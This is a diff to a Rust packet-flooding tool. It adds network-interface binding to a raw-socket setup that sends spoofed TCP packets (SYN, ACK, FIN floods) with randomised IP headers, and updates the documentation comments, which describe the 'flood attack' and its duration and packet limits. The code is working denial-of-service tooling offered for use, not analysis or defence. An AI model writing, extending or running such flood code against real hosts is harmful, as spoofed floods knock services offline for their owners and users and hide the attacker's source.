@@ -3,8 +3,8 @@ use crate::progress_bar::ProgressBar;
 use crate::tcp::TcpHeader;
 use rand::Rng;
 use socket2::{Domain, Protocol, SockAddr, Socket, Type};
-use std::net::{Ipv4Addr, SocketAddrV4};
 use std::io;
+use std::net::{Ipv4Addr, SocketAddrV4};
 use std::time::{Duration, Instant};
 /// Initializes a raw socket for sending raw IP packets.
 ///
@@ -16,6 +16,7 @@ use std::time::{Duration, Instant};
 /// * `dest_ip` - The destination IP address as a string.
 /// * `dest_port` - The destination port number.
 /// * `packet_len` - The total length of the raw IP packet.
+/// * `iface` - The network interface to bind the socket to. Available only on [iOS or macOS or tvOS or watchOS](https://docs.rs/socket2/latest/socket2/struct.Socket.html#method.device_index_v4).
 ///
 /// # Returns
 ///
@@ -35,9 +36,15 @@ use std::time::{Duration, Instant};
 /// let dest_ip = "192.168.0.2";
 /// let dest_port = 8080;
 /// let packet_len = 1500;
-/// // let socket = init_socket(dest_ip, dest_port, packet_len).unwrap();
+/// let iface = "eth0";
+/// // let socket = init_socket(dest_ip, dest_port, packet_len, Some(iface)).unwrap();
 /// ```
-pub fn init_socket(dest_ip: &str, dest_port: u16, packet_len: usize) -> io::Result<Socket> {
+pub fn init_socket(
+    dest_ip: &str,
+    dest_port: u16,
+    packet_len: usize,
+    _iface: Option<&str>,
+) -> io::Result<Socket> {
     let socket = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::from(6)))?;
     let dest_addr = SocketAddrV4::new(dest_ip.parse().unwrap(), dest_port);
     socket.set_header_included(true)?;
@@ -45,7 +52,17 @@ pub fn init_socket(dest_ip: &str, dest_port: u16, packet_len: usize) -> io::Resu
     socket.set_tos(0)?;
     socket.set_ttl(60)?;
     socket.set_send_buffer_size(packet_len)?;
-
+    // Bind socket to network interface on supported platforms
+    #[cfg(any(
+        target_os = "ios",
+        target_os = "macos",
+        target_os = "tvos",
+        target_os = "watchos"
+    ))]
+    if let Some(iface_name) = _iface {
+        let iface_index = socket.device_index_v4(&iface_name)?;
+        socket.bind_device_by_index_v4(Some(&iface_index))?;
+    }
     Ok(socket)
 }
 
@@ -115,7 +132,8 @@ pub fn create_combined_header(ip_header: &IpHeader, tcp_header: &TcpHeader) -> V
 /// 2. Fill in the IP header with random values and calculate the packet length.
 /// 3. Calculate the TCP checksum.
 /// 4. Combine the IP and TCP headers into a buffer.
-/// 5. Send the spoofed packet using the previously initialized `socket` object.
+/// 5. Send the spoofed packet using the previously initialized `socket` object and specified network interface
+///    (only on iOS, macOS, tvOS, or watchOS platforms).
 /// 6. Repeat the above steps until the specified duration is reached or the specified number of packets is sent.
 ///
 /// # Arguments
@@ -126,6 +144,7 @@ pub fn create_combined_header(ip_header: &IpHeader, tcp_header: &TcpHeader) -> V
 /// * `flag` - The TCP flag to set in the packets (e.g., "syn", "ack", "fin").
 /// * `duration` - The duration of the flood attack in minutes.
 /// * `number` - The maximum number of packets to send. Set to `usize::MAX` for unlimited packets.
+/// * `iface` - The network interface to bind the socket to. Available only on [iOS or macOS or tvOS or watchOS](https://docs.rs/socket2/latest/socket2/struct.Socket.html#method.device_index_v4).
 ///
 /// # Returns
 ///
@@ -144,12 +163,13 @@ pub fn create_combined_header(ip_header: &IpHeader, tcp_header: &TcpHeader) -> V
 /// let flag = "syn";
 /// let duration = 2;
 /// let number = 100;
-/// // tcp_flood(packet_len, dest_ip, dest_port, flag, duration, number);
+/// let iface = "eth0";
+/// // tcp_flood(packet_len, dest_ip, dest_port, flag, duration, number, iface);
 /// ```
 ///
 /// In this example, the `tcp_flood` function is used to send TCP flood packets with a packet length of 1500 bytes,
 /// targeting the IP address "192.168.1.10" on port 80. The flood is configured to run for 2 minutes or until 100
-/// packets are sent, whichever comes first.
+/// packets are sent, whichever comes first, and it is bound to the "eth0" network interface.
 pub fn tcp_flood(
     packet_len: usize,
     dest_ip: &str,
@@ -157,6 +177,7 @@ pub fn tcp_flood(
     flag: &str,
     duration: usize,
     number: usize,
+    iface: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
     // Create a custom progress bar
     let mut progress_bar = ProgressBar::new(number, duration * 60);
@@ -165,7 +186,7 @@ pub fn tcp_flood(
     let duration_limit = Duration::from_secs((duration * 60) as u64);
 
     // Initialize the socket. One socket per thread!
-    let socket = init_socket(dest_ip, dest_port, packet_len)?;
+    let socket = init_socket(dest_ip, dest_port, packet_len, Some(iface))?;
 
     for i in 0..number {
         if start_time.elapsed() > duration_limit {
